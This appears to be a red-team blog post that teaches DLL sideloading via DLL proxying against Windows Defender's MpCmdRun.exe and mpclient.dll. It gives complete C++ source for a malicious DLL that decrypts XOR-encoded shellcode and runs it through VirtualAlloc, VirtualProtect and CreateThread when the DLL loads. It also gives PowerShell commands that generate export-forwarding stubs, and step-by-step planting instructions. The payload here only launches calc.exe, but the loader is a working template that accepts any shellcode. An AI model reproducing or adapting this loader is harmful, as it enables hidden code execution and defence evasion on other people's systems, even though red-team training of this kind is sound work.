---
title: "DLL Sideloading Exploitation via 'DLL Proxying'"
date: 2022-10-02
categories: redteam
published: true
---

## DLL Sideloading

I'm going to cover an example of how to perform a DLL sideload from start to finish using a C++ payload and a legitimate DLL commonly found on disk. The specific technique covered is known as "**DLL proxying**" where we use the legitimate DLL along with a malicious DLL which exports all the functions that the legit DLL to execute properly. <br >


**In this post, we'll walk through the following steps:**
- What is DLL sideloading and DLL proxying
- How to choose an EXE and DLL to sideload
- How to create the malicous DLL to run shellcode
- How to find the exported functions needed to sideload the DLL
- Putting everything together for a successful DLL sideload attack

But first...


### What is DLL sideloading?

[Source: MITRE](https://attack.mitre.org/techniques/T1574/002/)
_"Side-loading involves hijacking which DLL a program loads. 
But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may 
directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s)."_

So we need to choose a legitimate EXE, find a DLL that it loads from disk, create a malicious DLL which runs shellcode, then copy/upload the EXE and DLL  to the same folder. Upon executing the EXE, it should sideload the malicious DLL hosted in the same folder.


### What is DLL proxying
The specific technique of DLL hijacking we'll walkthrough is called DLL proxying which uses the following steps:
1. EXE starts and calls `malicious.dll` in same folder
2. `malicious.dll` calls legitimate `dll_orig.dll` in same folder by exporting all functions from the legitimate DLL
3. Shellcode/payload runs in `malicious.dll` and also calls `dll_orig.dll` from the exported functions 
<br />
The execution flow of DLL proxying looks like this ([Source: ired.team](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)):

![image](https://user-images.githubusercontent.com/35749735/195198423-f5e76979-65ec-480b-a4c3-a2e032149e81.png)


### Choosing an EXE and DLL to sideload
There are various methods we can use to find a legitimate EXE and DLL which it loads from disk. A public repository and great resource called [Hijack Libs](https://hijacklibs.net/) can easily be used to search for known EXEs and DLLs that could be used for DLL sideloading or DLL hijacking. We could use this application to filter on specific vendors of types of DLL hijacks such as sideloading.

![hijack libs example](https://user-images.githubusercontent.com/35749735/192627446-8402c80e-af7d-4433-97ef-40b4965e3eea.png)

Alternatively, we could also use [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) from Windows SysInternals to manually analyze existing running executables and determine which DLLs are being loaded by the process. We can load Procmon with the following filters to hunt for DLLs being loaded by 64-bit processes:

- __Path -> ends with -> .dll__
- __Architecture -> is -> 64-bit__ (assuming we want 64-bit target EXEs)

![image](https://user-images.githubusercontent.com/35749735/192628830-12bbd8e2-3ddf-4b2a-9741-44634c1cfe0c.png)

We can scroll through the output of Procmon to find executables and DLLs that are currently being loaded on the system. As an example, if we wanted to search for a DLL sideload against Windows Defender's AMSI scanner (**MpCmdRun.exe**), we can add the following filter: 
- __Process Name -> is -> MpCmdRun.exe__ <br />

Then we can run the executable from its expected location `%PROGRAMFILES%\Windows Defender\mpcmdrun.exe`, and in Procmon we can see the DLLs being loaded by the **MpCmdRun.exe** process which we could attempt to sideload. The target DLL **mpclient.dll** looks like a good target!

![image](https://user-images.githubusercontent.com/35749735/195383300-269d1609-ae87-49f9-9eaa-3e5f672777e9.png)


The DLL **mpclient.dll** is also a known DLL sideload that can be found in Hijack Libs at [this URL](https://hijacklibs.net/entries/microsoft/built-in/mpclient.html).

A third option for finding your own DLL sideloads is to use the publicly available tool [Windows Feature Hunter (WFH)](https://github.com/ConsciousHacker/WFH) from [@ConsciousHacker](https://twitter.com/conscioushacker) which has its own documentation and method for finding vulnerable DLL sideloads on your own system. If you prefer to go the easy route, there is a CSV list within the GitHub repo of discovered EXEs and their DLL sideloads [found here](https://github.com/ConsciousHacker/WFH/blob/main/examples/) which has over 900 DLL sideloads you could abuse. Another blog has many more DLL hijacking examples [HERE](https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv).


### Creating a malicious DLL

Once we've found our executable and DLL sideload to target, we can now start to create our malicous DLL which will execute shellcode. In this example, we're going to target the **MpCmdRun.exe (Windows Defender)** process with the DLL sideload of **mpclient.dll**.

Start by creating a new C++ project in Visual Studio for a "Dyamic-Link Library (DLL)" or make a new TXT file in a text editor to manually write your DLL. Visual Studio will compile the C++ DLL for you, otherwise if you're using a text editor then you can compile it using the **cl.exe** command-line utility.

We're going to create a relatively straightforward DLL which uses XOR decryption to decrypt shellcode and launch it via _CreateThread_. Upon execution, the shellcode will launch _calc.exe_ as a proof-of-concept.

Here is the template code for our malicious DLL **mpclient.dll** which will run shellcode to spawn _calc.exe_:
```cpp
#include "pch.h"
#include <windows.h>

// XOR function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

// Calc.exe shellcode (exit function = thread)
unsigned char payload[] = { 0xac,0x08,0xf0,0x97,0x87,0xd8,0xf0,0x30,0x72,0x64,0x60,0x01,0x01,0x23,0x21,0x26,0x66,0x78,0x01,0xa0,0x01,0x69,0xdb,0x12,0x13,0x3b,0xfc,0x62,0x28,0x78,0xf9,0x36,0x01,0x18,0xcb,0x01,0x23,0x3f,0x3f,0x87,0x7a,0x38,0x29,0x10,0x99,0x08,0x42,0xb3,0xdb,0x0c,0x51,0x4c,0x70,0x48,0x01,0x11,0x81,0xba,0x7e,0x36,0x31,0xf1,0xd2,0x9f,0x36,0x60,0x01,0x08,0xf8,0x21,0x57,0xbb,0x72,0x0c,0x3a,0x65,0xf1,0xdb,0xc0,0xfb,0x73,0x77,0x30,0x78,0xb5,0xb2,0x10,0x46,0x18,0x41,0xa3,0x23,0xfc,0x78,0x28,0x74,0xf9,0x24,0x01,0x19,0x41,0xa3,0x90,0x21,0x78,0xcf,0xf9,0x33,0xef,0x15,0xd8,0x08,0x72,0xa5,0x3a,0x01,0xf9,0x78,0x43,0xa4,0x8d,0x11,0x81,0xba,0x7e,0x36,0x31,0xf1,0x08,0x92,0x11,0xd0,0x1c,0x43,0x3f,0x57,0x7f,0x75,0x09,0xe1,0x07,0xbc,0x79,0x14,0xcb,0x33,0x57,0x3e,0x31,0xe0,0x56,0x33,0xef,0x2d,0x18,0x04,0xf8,0x33,0x6b,0x79,0x31,0xe0,0x33,0xef,0x25,0xd8,0x08,0x72,0xa3,0x36,0x68,0x71,0x68,0x2c,0x3d,0x7b,0x11,0x18,0x32,0x2a,0x36,0x6a,0x78,0xb3,0x9e,0x44,0x60,0x02,0xbf,0x93,0x2b,0x36,0x69,0x6a,0x78,0xf9,0x76,0xc8,0x07,0xbf,0x8c,0x8c,0x2a,0x78,0x8a,0x31,0x72,0x64,0x21,0x50,0x40,0x73,0x73,0x3f,0xbd,0xbd,0x31,0x73,0x64,0x21,0x11,0xfa,0x42,0xf8,0x18,0xb7,0xcf,0xe5,0xc9,0x84,0x3c,0x7a,0x4a,0x32,0xc9,0xd1,0xa5,0x8d,0xad,0x8d,0xb1,0x69,0xd3,0x84,0x5b,0x4f,0x71,0x4c,0x3a,0xb0,0x89,0x84,0x54,0x55,0xfb,0x34,0x60,0x05,0x5f,0x5a,0x30,0x2b,0x25,0xa8,0x8a,0xbf,0xa6,0x10,0x16,0x5c,0x53,0x1e,0x17,0x1c,0x44,0x50 };
unsigned int payload_len = sizeof(payload);

// Standard function to allocate memory, copy shellcode to it, and execute the thread
extern __declspec(dllexport) int RunThis(void);
int RunThis(void) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	// Decryption key
	char key[] = "P@ssw000rd!";

	// Decrypt the shellcode
	XOR((char*)payload, payload_len, key, sizeof(key));

	// Allocate memory
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, run the shellcode
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, 0);
	}
	

	return 0;
}

//Runs as the Main() function
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

	switch (fdwReason) {
		//DLL_PROCESS_ATTACH will run when the DLL is loaded within a process
	case DLL_PROCESS_ATTACH:
		RunThis();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

### Finding exported functions from the leigt DLL

Before we can finalize the malicious DLL, we will need to get a list of exported functions from the existing legitimate DLL on disk and add it to our malicious DLL. In order for the executable to run properly with our sideloaded DLL, we have to add the DLL's exported functions to the malicious DLL to forward these functions to the legit DLL on disk.<br /><br />

Now to get the exported functions from the legitimate DLL **mpclient.dll** at its expected location ([detailed here](https://hijacklibs.net/entries/microsoft/built-in/mpclient.html)), we can use this [PowerShell script](https://gist.github.com/wsummerhill/23c138be8f953155e20c01055d6cf53f) with the following commands:<br />
```powershell
PS> . .\Get-DLL-Exports.ps1
PS> Get-DLL-Exports -DllPath %PROGRAMDATA%\Microsoft\Windows Defender\Platform\%VERSION%\mpclient.dll -ExportsToCpp C:\output\folder\MpClient-exports.txt
```

After executing the PowerShell command, the output file **MpClient-exports.txt** should have all the DLL exports in it as shown below (shortened for brevity):
```cpp
// --> ADD ALL EXPORTS BELOW TO THE TOP OF YOUR .CPP APPLICATION <--
#pragma once
#pragma comment (linker, "/export:MpAddDynamicSignatureFile=MpClient_orig.MpAddDynamicSignatureFile,@43")
#pragma comment (linker, "/export:MpAllocMemory=MpClient_orig.MpAllocMemory,@44")
#pragma comment (linker, "/export:MpAmsiCloseSession=MpClient_orig.MpAmsiCloseSession,@45")
#pragma comment (linker, "/export:MpAmsiNotify=MpClient_orig.MpAmsiNotify,@46")
#pragma comment (linker, "/export:MpAmsiScan=MpClient_orig.MpAmsiScan,@47")
#pragma comment (linker, "/export:MpAsrSetHipsUserExclusion=MpClient_orig.MpAsrSetHipsUserExclusion,@48")
#pragma comment (linker, "/export:MpChangeCapability=MpClient_orig.MpChangeCapability,@49")
#pragma comment (linker, "/export:MpCheckAccessForClipboardOperation=MpClient_orig.MpCheckAccessForClipboardOperation,@50")
#pragma comment (linker, "/export:MpCheckAccessForClipboardOperationEx=MpClient_orig.MpCheckAccessForClipboardOperationEx,@51")
#pragma comment (linker, "/export:MpCheckAccessForClipboardOperationEx2=MpClient_orig.MpCheckAccessForClipboardOperationEx2,@52")
...
```

From the output, can see that **mpclient.dll** has many DLL exports which we can add to the top of our code now, just under the `#inclue` import lines.<br />
Once you add the exports to the DLL code, it should look something like this:

![image](https://user-images.githubusercontent.com/35749735/195376423-8dd1add9-13d5-47c5-b167-f21cc59bcf5f.png)

The export functions will forward execution to the legitimate DLL, named "**mpclient_orig**" as seen from the output above. To use this, we'll have to rename the original DLL to **mpclient_orig.dll** and _place it in the same folder as the legit EXE and malicious DLL to execute the DLL sideload_.

Now compile your malicious DLL in Visual Studio or using `cl.exe` to the output file named **mpclient.dll**!


### Putting it all together

To combine everything together and actually execute our DLL sideload, we need to copy the **original EXE**, **malicious DLL**, and **original DLL** into the same folder. Place the following files to your target folder with these naming conventions: <br />
- MpCmdRun.exe
- mpclient.dll (malicious DLL)
- mpclient_orig.dll (original DLL)

It should look something like this:
![image](https://user-images.githubusercontent.com/35749735/195417269-99e84b29-dc21-41ea-af88-85999bffe7ba.png)


Finally, we can double-click or execute **MpCmdRun.exe** from command-line and we should see _calc.exe_ spawn in the foreground if it properly worked! Note for this executable, you may have to disable Defender first to get it working. But generally as a proof-of-concept we've shown that the DLL sideload via DLL proxying of Windows Defender works!

![image](https://user-images.githubusercontent.com/35749735/195417916-03906f38-3732-4943-869d-622c19965bc9.png)

